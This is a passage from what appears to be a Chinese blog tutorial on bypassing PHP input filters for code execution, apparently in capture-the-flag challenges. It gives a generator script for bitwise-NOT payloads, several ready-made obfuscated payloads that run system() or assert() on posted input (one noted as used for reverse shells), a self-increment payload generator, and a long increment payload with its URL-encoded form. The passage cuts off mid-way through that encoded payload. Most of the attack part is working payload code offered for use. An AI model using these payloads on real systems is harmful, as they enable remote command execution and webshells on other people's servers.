class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$result1</span> .= <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;通过在URL内GET方法提交?cmd=\&quot;具体命令\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串：&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码：&quot;</span>.<span class="variable">$result1</span>;</span><br></pre></td></tr></table></figure><p>下面给出一个比较通用的取反payload<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250616110739.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php5、7.2 pss = _</span></span><br><span class="line"><span class="variable">$_</span>=~(<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>);<span class="variable">$__</span>=~(<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">// 无回显 `$_POST[_]` pass = _ 一般用来反弹shell</span></span><br><span class="line"><span class="variable">$__</span>=~(<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;`<span class="variable">$___</span>[_]`;</span><br><span class="line"><span class="comment">// `system($_POST[_])` pss = _</span></span><br><span class="line"><span class="variable">$_</span>=~(<span class="string">&quot;%8c%86%8c%8b%9a%92&quot;</span>);<span class="variable">$__</span>=~(<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><h2 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h2><p>自增绕过，主要是利用<code>++</code>的方式去1，如果可以拿到<code>A</code>那么就可以拿到所有可见的字母和数字，这个A字母的获取可以通过下面方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;       <span class="comment">// Array</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>[<span class="number">0</span>];    <span class="comment">// A</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>[<span class="variable">$__</span>];  <span class="comment">// A</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>里面的<code>[]</code>是一个数组，如果直接输出则会返回Array，这样第一个字母就是咱们想要的内容了，但是如果直接通过<code>[0]</code>的方式去拿，会出问题，拿不到需要给他变成字符串形式<code>[].&#39;&#39;</code>即可，然后0我们是没办法输入的，我们可以随便传入一个不存在的变量，不存在的变量都会返回<code>false</code>也就是<code>0</code>,我们直接使用他就可以第一个。下面给一个生成自增的脚本，但是似乎有点问题，开头的第一个命令似乎百分百是<code>A</code>,即只能构造ASSERT的，后面会给出一些常用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$cmd2</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;post&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$_ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC2</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$____ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$POC_pat7</span> = <span class="string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$POC_pat7</span>;</span><br><span class="line">    <span class="title function_ invoke__">POC</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd2</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">POC2</span>(<span class="variable">$cmd2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后下面直接给一个常用的payload<code>ASSERT($_POST[_]);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]); </span><br></pre></td></tr></table></figure><p>这个是需要抓换url编码的，转换后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;!&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%40&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span 